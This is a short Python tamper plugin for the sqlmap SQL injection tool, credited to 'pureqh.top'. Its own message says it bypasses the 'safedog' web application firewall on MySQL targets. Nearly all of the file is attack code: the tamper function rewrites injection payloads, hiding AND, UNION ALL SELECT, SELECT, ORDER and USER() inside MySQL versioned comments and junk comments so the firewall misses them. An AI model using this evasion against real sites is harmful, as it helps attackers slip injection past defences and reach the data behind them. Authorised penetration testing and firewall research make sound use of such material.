#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
        payload=payload.replace('AND','/*!11444AND*/')
        payload=payload.replace('ORDER','order/*!80000aaa*/')
        payload=payload.replace('UNION ALL SELECT','/*!11444union*/ /*!11444all*/ /*!11444select*/')
        payload=payload.replace("SELECT","/*!12447select*/")
        payload=payload.replace(" USER()"," user/*!80000aaa*/()")
        return payload
